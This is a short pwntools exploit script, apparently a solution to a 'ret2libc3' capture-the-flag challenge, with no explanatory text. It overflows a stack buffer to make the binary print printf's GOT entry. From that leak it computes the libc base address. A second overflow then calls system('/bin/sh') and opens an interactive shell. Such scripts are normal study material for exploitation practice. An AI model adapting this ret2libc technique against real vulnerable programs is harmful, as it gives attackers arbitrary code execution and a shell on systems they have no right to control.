from pwn import *
p = process("./ret2libc3")
elf = p.elf
main = elf.sym['main']
printf = 0x8048430 
printf_got = elf.sym['printf']

p.sendline(b"a"*0x70 + b''.join(p32(i) for i in [
    printf, main, printf_got]))
p.recvuntil(b"an you find it !?")
printf_libc = int.from_bytes(p.recv(4), "little")
libc = ELF("/usr/lib32/libc-2.31.so")
libc.address = printf_libc - libc.sym['printf']
p.sendline(b"a"*(0x64+4) + b''.join(p32(i) for i in [
    libc.sym['system'], 0, next(libc.search(b'/bin/sh'))]))
p.clean()
p.interactive()